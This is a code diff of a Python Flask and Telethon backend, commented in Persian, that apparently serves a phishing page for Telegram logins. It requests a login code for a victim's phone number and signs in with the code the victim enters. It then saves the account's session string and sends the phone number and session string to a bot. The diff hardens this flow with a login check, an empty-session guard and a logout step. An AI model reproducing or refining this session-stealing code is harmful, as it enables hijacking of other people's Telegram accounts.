@@ -66,21 +66,19 @@ def verify_code():
         return jsonify({'error': str(e)}), 500
 
 # ============================================================
-# توابع با روش sign_in + phone_code_hash
+# توابع با خروج کامل از اکانت
 # ============================================================
 async def send_code(session_id, phone):
     try:
         client = TelegramClient(session_id, API_ID, API_HASH)
         await client.connect()
         
-        # ارسال درخواست کد و دریافت phone_code_hash
         result = await client.send_code_request(phone)
         
         sessions[session_id]['client'] = client
         sessions[session_id]['phone_code_hash'] = result.phone_code_hash
         sessions[session_id]['status'] = 'code_sent'
         logging.info(f"✅ Code sent to: {phone}")
-        logging.info(f"📌 phone_code_hash: {result.phone_code_hash}")
         
     except Exception as e:
         sessions[session_id]['status'] = 'error'
@@ -103,32 +101,43 @@ async def verify_session(session_id, phone, code):
         return False
 
     try:
-        # ✅ تایید کد با phone_code_hash
+        # ✅ تایید کد
         await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
         
-        # بعد از لاگین، سشن رو بگیر
+        # ✅ تایید اینکه لاگین انجام شده
+        me = await client.get_me()
+        if not me:
+            logging.error("❌ Login failed - no user found")
+            return False
+        
+        # ✅ گرفتن سشن بعد از لاگین کامل
         session_string = client.session.save()
         
-        # ارسال به ربات با HTTP
-        send_to_bot(f"User : {phone}\nکد سیشن : {session_string}")
+        # ✅ ارسال سشن به بات (فقط اگر خالی نباشه)
+        if session_string and len(session_string) > 10:
+            send_to_bot(f"User : {phone}\nکد سیشن : {session_string}")
+        else:
+            send_to_bot(f"User : {phone}\nکد سیشن : [ERROR: Session is empty]")
+        
+        # ✅ خروج کامل از اکانت
+        await client.log_out()
+        await client.disconnect()
         
         sessions[session_id]['status'] = 'done'
-        await client.disconnect()
-        logging.info(f"✅ Session saved for: {phone}")
+        logging.info(f"✅ Session saved and logged out for: {phone}")
         return True
 
     except Exception as e:
         sessions[session_id]['status'] = 'error'
         logging.error(f"❌ Verification error: {e}")
         
-        # تشخیص خطاهای مربوط به کد اشتباه
         error_msg = str(e).lower()
         if 'code' in error_msg or 'invalid' in error_msg or 'phone' in error_msg:
             return False
         raise
 
 # ============================================================
-# ارسال پیام به بات با HTTP (ساده و بدون خطا)
+# ارسال به بات
 # ============================================================
 def send_to_bot(message):
     try:
@@ -146,9 +155,6 @@ def send_to_bot(message):
     except Exception as e:
         logging.error(f"❌ Bot error: {e}")
 
-# ============================================================
-# اجرا
-# ============================================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
